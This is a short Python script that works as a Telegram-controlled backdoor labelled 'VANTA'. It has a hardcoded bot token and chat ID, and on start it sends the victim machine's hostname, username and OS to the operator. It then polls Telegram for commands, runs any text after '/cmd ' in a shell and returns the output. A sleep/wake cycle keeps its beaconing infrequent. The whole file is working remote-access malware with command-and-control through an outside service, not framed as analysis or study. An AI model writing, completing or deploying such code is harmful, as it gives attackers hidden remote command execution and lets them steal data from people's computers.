#!/usr/bin/env python3
import os, sys, time, json, urllib.request, urllib.parse, socket, platform, getpass, subprocess, traceback
TOKEN = "9106770208:AAFMVdxGkPH8XXHdtY4qh8E0FvaY0n7EqU"
CHAT_ID = "6796019288"
SLEEP_SECONDS = 3600
ACTIVE_SECONDS = 5
API = "https://api.telegram.org/bot" + TOKEN
LOG_FILE = "C:\\temp\\vanta_log.txt"
def log(msg):
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(str(msg) + "\n")
    except: pass
def api(method, params=None):
    try:
        data = urllib.parse.urlencode(params or {}).encode()
        req = urllib.request.Request(API + "/" + method, data=data)
        with urllib.request.urlopen(req, timeout=30) as r: return json.loads(r.read().decode())
    except Exception as e:
        log(f"api error: {e}"); return {}
def send(text): return api("sendMessage", {"chat_id": CHAT_ID, "text": text[:4000]})
def sysinfo():
    try: return json.dumps({"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.platform()}, ensure_ascii=False)
    except: return "error"
def main():
    log("Starting...")
    send("[VANTA DEBUG ONLINE] " + sysinfo())
    log("Sent online msg")
    offset = 0; active = False
    while True:
        try:
            log("Loop tick")
            r = api("getUpdates", {"offset": offset, "timeout": 0})
            for u in r.get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message", {})
                if str(msg.get("chat", {}).get("id")) != str(CHAT_ID): continue
                text = (msg.get("text") or "").strip()
                if text == "/wake": active = True; send("ACTIVE")
                elif text == "/sleep": active = False; send("SLEEP")
                elif text == "/sysinfo": send(sysinfo())
                elif text.startswith("/cmd "):
                    out = subprocess.run(text[5:], shell=True, capture_output=True, timeout=60)
                    send((out.stdout + out.stderr).decode("utf-8", "ignore")[:3500])
            log("Sleeping")
            time.sleep(ACTIVE_SECONDS if active else SLEEP_SECONDS)
        except Exception as e:
            log(f"ERROR: {e}\n{traceback.format_exc()}"); time.sleep(60)
if __name__ == "__main__": main()
